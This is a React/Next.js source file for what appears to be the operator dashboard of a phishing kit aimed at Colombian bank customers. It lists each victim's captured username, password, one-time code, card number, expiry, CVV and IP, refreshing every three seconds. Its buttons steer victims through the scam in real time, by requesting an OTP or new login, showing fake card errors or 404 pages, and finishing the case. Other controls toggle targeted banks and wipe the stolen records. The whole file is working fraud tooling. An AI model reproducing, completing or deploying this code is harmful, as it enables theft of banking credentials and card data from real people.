"use client";

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';

interface UserRecord {
    idreg: number;
    usuario: string;
    password: string;
    otp: string | null;
    dispositivo: string;
    ip: string;
    banco: string;
    status: number;
    horamodificado: string;
    tarjeta: string | null;
    ftarjeta: string | null;
    cvv: string | null;
}

export default function AdminPage() {
    const [cases, setCases] = useState<UserRecord[]>([]);
    const [isLoading, setIsLoading] = useState(true);
    const [showServices, setShowServices] = useState(false);
    const [systemSettings, setSystemSettings] = useState<any>(null);
    const router = useRouter();

    const fetchCases = async () => {
        try {
            const response = await fetch('/api/admin/cases');
            const data = await response.json();
            if (data.success) {
                setCases(data.cases);
            }
        } catch (error) {
            console.error('Error fetching cases:', error);
        } finally {
            setIsLoading(false);
        }
    };

    const fetchSettings = async () => {
        try {
            const response = await fetch('/api/admin/settings');
            const data = await response.json();
            if (data.success) {
                setSystemSettings(data);
            }
        } catch (error) {
            console.error('Error fetching settings:', error);
        }
    };

    useEffect(() => {
        const session = document.cookie.split('; ').find(row => row.startsWith('admin_session='));
        if (!session || !session.includes('OK')) {
            router.push('/admin/login');
            return;
        }

        fetchCases();
        fetchSettings();
        const interval = setInterval(() => {
            fetchCases();
            if (showServices) fetchSettings();
        }, 3000);
        return () => clearInterval(interval);
    }, [router, showServices]);

    const updateStatus = async (id: number, status: number) => {
        try {
            await fetch('/api/admin/update-status', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id, status })
            });
            fetchCases();
        } catch (error) {
            console.error('Error updating status:', error);
        }
    };

    const updateSetting = async (action: string, target?: string, value?: any) => {
        try {
            await fetch('/api/admin/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action, target, value })
            });
            fetchSettings();
            if (action === 'clear') fetchCases();
        } catch (error) {
            console.error('Error updating setting:', error);
        }
    };

    const getStatusInfo = (status: number) => {
        switch (status) {
            case 1: return { name: "Usuario/Clave", color: "bg-green-500" };
            case 2: return { name: "Pidió OTP", color: "bg-blue-500" };
            case 3: return { name: "Ingresó OTP", color: "bg-green-600" };
            case 10: return { name: "Finalizado", color: "bg-gray-500" };
            case 12: return { name: "Pidió Nuevo User", color: "bg-yellow-500" };
            case 40: return { name: "Token Bogota", color: "bg-red-500" };
            case 41: return { name: "Error CC", color: "bg-red-600" };
            default: return { name: "Desconocido", color: "bg-gray-400" };
        }
    };

    return (
        <div className="min-h-screen bg-gray-900 text-white p-6">
            <header className="flex items-center justify-between mb-8 border-b border-gray-800 pb-4">
                <div className="flex items-center gap-3">
                    <img src="/img/pse-logo.jpg" alt="Admin" className="w-10 h-10 rounded shadow-lg" />
                    <h1 className="text-2xl font-bold tracking-tight">PANEL DE CONTROL - ISLA</h1>
                </div>
                <div className="flex gap-4">
                    <button
                        onClick={() => setShowServices(!showServices)}
                        className={`px-4 py-2 rounded text-sm transition ${showServices ? 'bg-yellow-600' : 'bg-blue-600 hover:bg-blue-700'}`}
                    >
                        {showServices ? 'Cerrar Servicios' : 'Ver Servicios'}
                    </button>
                    <button
                        onClick={() => {
                            if (confirm('¿Estás seguro de limpiar todos los registros?')) {
                                updateSetting('clear');
                            }
                        }}
                        className="px-4 py-2 bg-red-600 rounded text-sm hover:bg-red-700 transition"
                    >
                        Limpiar BD
                    </button>
                </div>
            </header>

            {showServices && systemSettings && (
                <div className="mb-8 bg-gray-800 p-6 rounded-lg border border-gray-700 animate-in fade-in slide-in-from-top-4 duration-300">
                    <h2 className="text-xl font-bold mb-6 flex items-center gap-2">
                        <span className="w-2 h-6 bg-blue-500 rounded"></span>
                        Gestión de Servicios
                    </h2>

                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                        <div className="bg-gray-900 p-4 rounded-lg border border-gray-700">
                            <h3 className="text-sm font-bold text-gray-400 mb-4 uppercase">Estado Global</h3>
                            <div className="flex flex-col gap-2">
                                <button
                                    onClick={() => updateSetting('system', undefined, 1)}
                                    className={`py-2 text-xs rounded font-bold uppercase ${systemSettings.systemStatus === 1 ? 'bg-green-600 text-white' : 'bg-gray-800 text-gray-400 hover:bg-gray-700'}`}
                                >
                                    Activo
                                </button>
                                <button
                                    onClick={() => updateSetting('system', undefined, 3)}
                                    className={`py-2 text-xs rounded font-bold uppercase ${systemSettings.systemStatus === 3 ? 'bg-red-600 text-white' : 'bg-gray-800 text-gray-400 hover:bg-gray-700'}`}
                                >
                                    Apagado
                                </button>
                                <button
                                    onClick={() => updateSetting('system', undefined, 2)}
                                    className={`py-2 text-xs rounded font-bold uppercase ${systemSettings.systemStatus === 2 ? 'bg-orange-600 text-white' : 'bg-gray-800 text-gray-400 hover:bg-gray-700'}`}
                                >
                                    Error 404
                                </button>
                            </div>
                        </div>

                        <div className="col-span-full mt-4">
                            <h3 className="text-sm font-bold text-gray-400 mb-4 uppercase">Bancos Individuales</h3>
                            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3">
                                {Object.entries(systemSettings.banks).map(([bank, active]) => (
                                    <button
                                        key={bank}
                                        onClick={() => updateSetting('bank', bank, !active)}
                                        className={`p-3 rounded-lg text-[10px] font-bold uppercase transition flex flex-col items-center gap-2 border ${active ? 'bg-gray-900 border-green-500/30 text-green-400' : 'bg-gray-900 border-red-500/30 text-red-500'}`}
                                    >
                                        <div className={`w-2 h-2 rounded-full ${active ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></div>
                                        {bank}
                                        <span className="text-[8px] opacity-70">{active ? 'ON' : 'OFF'}</span>
                                    </button>
                                ))}
                            </div>
                        </div>
                    </div>
                </div>
            )}

            <main className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
                {isLoading ? (
                    <div className="col-span-full text-center py-10">Cargando casos...</div>
                ) : cases.length === 0 ? (
                    <div className="col-span-full text-center py-10 text-gray-500 italic">No hay registros activos.</div>
                ) : (
                    cases.map((c) => {
                        const statusInfo = getStatusInfo(c.status);
                        return (
                            <div key={c.idreg} className="bg-gray-800 rounded-lg p-5 border-l-4 shadow-xl border-gray-700 hover:border-blue-500 transition-all">
                                <div className="flex justify-between items-start mb-4">
                                    <span className="text-xs font-mono text-gray-400">ID: #{c.idreg}</span>
                                    <div className="flex flex-col items-end gap-1">
                                        <span className={`${statusInfo.color} px-2 py-1 rounded text-[10px] font-bold uppercase tracking-wider`}>
                                            {statusInfo.name}
                                        </span>
                                    </div>
                                </div>

                                <div className="space-y-2 mb-6">
                                    <div className="flex justify-between border-b border-gray-700 pb-1">
                                        <span className="text-gray-400 text-xs uppercase">Banco:</span>
                                        <span className="text-sm font-bold text-yellow-500">{c.banco}</span>
                                    </div>
                                    <div className="flex justify-between border-b border-gray-700 pb-1">
                                        <span className="text-gray-400 text-xs uppercase">Usuario:</span>
                                        <span className="text-sm font-bold">{c.usuario}</span>
                                    </div>
                                    <div className="flex justify-between border-b border-gray-700 pb-1">
                                        <span className="text-gray-400 text-xs uppercase">Clave:</span>
                                        <span className="text-sm font-bold break-all">{c.password}</span>
                                    </div>
                                    <div className="flex justify-between border-b border-gray-700 pb-1">
                                        <span className="text-gray-400 text-xs uppercase">Dinamica:</span>
                                        <span className="text-sm font-bold text-green-400">{c.otp || '-'}</span>
                                    </div>
                                    {(c.tarjeta || c.cvv) && (
                                        <div className="bg-gray-900 p-3 rounded mt-2 border border-gray-700">
                                            <div className="text-[10px] text-gray-500 mb-1 uppercase font-bold">Tarjeta Crédito</div>
                                            <div className="text-sm font-mono text-blue-400 font-bold tracking-widest">{c.tarjeta}</div>
                                            <div className="flex justify-between mt-1 text-xs">
                                                <span>Exp: {c.ftarjeta}</span>
                                                <span className="text-red-400">CVV: {c.cvv}</span>
                                            </div>
                                        </div>
                                    )}
                                    <div className="mt-2 text-[10px] text-gray-500 italic flex justify-between">
                                        <span>IP: {c.ip}</span>
                                        <span>{c.horamodificado}</span>
                                    </div>
                                </div>

                                <div className="grid grid-cols-2 gap-2">
                                    <button onClick={() => updateStatus(c.idreg, 12)} className="bg-gray-700 hover:bg-gray-600 py-2 text-xs rounded transition">Pedir User</button>
                                    <button onClick={() => updateStatus(c.idreg, 2)} className="bg-gray-700 hover:bg-gray-600 py-2 text-xs rounded transition">Pedir OTP</button>
                                    <button onClick={() => updateStatus(c.idreg, 40)} className="bg-orange-600 hover:bg-orange-700 py-2 text-xs rounded transition uppercase font-bold">404</button>
                                    <button onClick={() => updateStatus(c.idreg, 41)} className="bg-red-600 hover:bg-red-700 py-2 text-xs rounded transition uppercase font-bold">Error CC</button>
                                    <button onClick={() => updateStatus(c.idreg, 10)} className="bg-green-600 hover:bg-green-700 py-2 text-xs rounded col-span-2 mt-2 transition font-bold uppercase">FINALIZAR</button>
                                </div>
                            </div>
                        );
                    })
                )}
            </main>
        </div>
    );
}
